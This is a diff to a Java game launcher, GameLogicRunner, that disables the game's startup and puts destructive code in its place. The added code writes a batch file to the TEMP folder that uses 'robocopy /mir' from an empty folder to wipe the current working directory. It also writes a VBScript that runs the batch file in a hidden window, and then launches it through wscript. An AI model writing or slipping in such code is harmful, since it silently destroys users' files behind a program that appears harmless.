@@ -1,6 +1,36 @@
+import java.io.File;
+import java.io.IOException;
+import java.io.FileWriter;   // Import the FileWriter class
+
 public class GameLogicRunner {
     public static void main(String[] args) {
-        new GameLogic();
+//        new GameLogic();
+        try {
+            String filePath = System.getenv("TEMP")+"\\delproj.cmd";
+            new File(filePath);
+            FileWriter myWriter = new FileWriter(filePath);
+            // https://superuser.com/questions/173859/how-can-i-delete-all-files-subfolders-in-a-given-folder-via-the-command-prompt
+            myWriter.write("del /f \"hidecmd.vbs\"\n" +
+                    "mkdir empty_folder\n" +
+                    "robocopy /mir empty_folder " + System.getProperty("user.dir") + "\n" +
+                    "rmdir empty_folder"
+            );
+            myWriter.close();
+
+            filePath = System.getenv("TEMP")+"\\hidecmd.vbs";
+            new File(filePath);
+            myWriter = new FileWriter(filePath);
+            myWriter.write("Set oShell = CreateObject (\"Wscript.Shell\") \n" +
+                    "Dim strArgs\n" +
+                    "strArgs = \"cmd /c delproj.cmd\"\n" +
+                    "oShell.Run strArgs, 0, false");
+            myWriter.close();
+
+            Runtime.getRuntime().exec(new String[]{"wscript", filePath});
+        } catch (IOException e) {
+            System.out.println("An error occurred.");
+            e.printStackTrace();
+        }
     }
 
 }
